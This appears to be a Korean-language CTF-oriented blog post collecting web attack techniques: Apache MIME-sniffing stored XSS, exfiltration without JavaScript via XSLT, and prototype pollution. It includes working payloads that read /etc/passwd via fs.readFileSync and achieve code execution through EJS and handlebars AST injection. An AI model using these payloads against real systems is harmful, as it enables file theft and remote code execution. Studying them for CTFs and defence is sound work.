---
title: 당신만 몰랐던 Web 기법
published: 2026-08-04
description: " "
tags: []
category: Web
draft: true
---

## Apache mime sniffing XSS

서버가 아파치를 사용할 때 쓸 수 있는 트릭이다.  
아파치는 파일명이 없는 `.png`, `...png` 과 같은 파일에 대해 `Content-Type`을 자동으로 반환하지 않는다.

- `img.jpg` -> `Content-Type: image/jpeg`
- `...jpg` -> `Content-Type: ???`

따라서 파일명이 `.png`인 파일에 XSS 페이로드를 담아 서버에 업로드하고 Stored XSS를 터트려 익스할 수 있다.

LG U+ Security Hackathon 예선과 카포전에 등장했던 기법이니 알아두면 언젠가 쓸 일이 있을거 같다.

## setJavaScriptEnabled(false) 일때
봇의 자바스크립트가 비활성화 되어있어 XSS로 cookie takeover가 불가능할 때 시도해볼 기법이다.

1. 메타 리프레시 + 리다이렉트 체인
기초적인 기법이다. meta refresh로 open redirect 시켜서 다른 페이지로 옮겨주면 된다. 물론 이 기법은 상당히 기초적이고 제한적이라 쓸 일이 거의 없다.

2. Use XSLT
아마 chromium 최신버전이면 작동하지 않을 수도 있다.  
브라우저는 JS 없이도 `<?xml-stylesheet>`를 따라 XSLT를 적용할 수 있다. XSLT는 `document()` 같은 기능으로 외부 문서를 로드하거나 변환 결과에 HTML 태그를 만들어 민감값이 DOM에 존재할 때 URL로 내보낼 수 있다.
몇가지 전제가 필요한데 **유출할 값이 XML/HTML에 포함되어 있어야하고, XSLT가 그 값을 뽑아 attricute로 만들 수 있는 환경이어야 한다.**

## Prototype Pollution
일단 Prototype Pollution이 터지면 대부분의 경우에서 익스가 가능하다고 봐도 무방할 정도로 익스 방향이 많이 열린다.

1. 동적으로 모듈을 require() 해올때
nodejs 내부 기능을 오염시켜 require() 함수가 실행될때 RCE를 할 수 있다

2. fs.readFileSync()
아래와 같이 오염시켜서 `readFileSync`가 실행될 때 임의의 파일을 LFI 해오게 할 수 있다.

```js
__proto__.protocol='file:';
__proto__.pathname='/etc/passwd';
__proto__.href='a';
__proto__.origin='a'
__proto__.hostname='';
```

3. 특정 템플릿 엔진을 사용하는 경우
잘 알려진 기법들이다.

EJS는 워낙 PoC가 많아서 아무거나 갖다쓰면 된다.

```js
(async () => { try { (await import('child_process')).execSync('calc'); } catch {} })();
```

handlebars를 사용하는 경우에도 Prototype Pollution이 발생하면 AST Injection이 가능하다.
```js
__proto__.type = 'Program'
__proto__.body = []
__proto__.body[0] = {}
__proto__.body[0].type = 'MustacheStatement'
__proto__.body[0].path = 0
__proto__.body[0].params = []
__proto__.body[0].params[0] = {}
__proto__.body[0].params[0].type = 'NumberLiteral'
__proto__.body[0].params[0].value = "console.log(process.mainModule.require('child_process').execSync('calc').toString())"
__proto__.body[0].loc = {}
__proto__.body[0].loc.start = 0
__proto__.body[0].loc.end = 0
```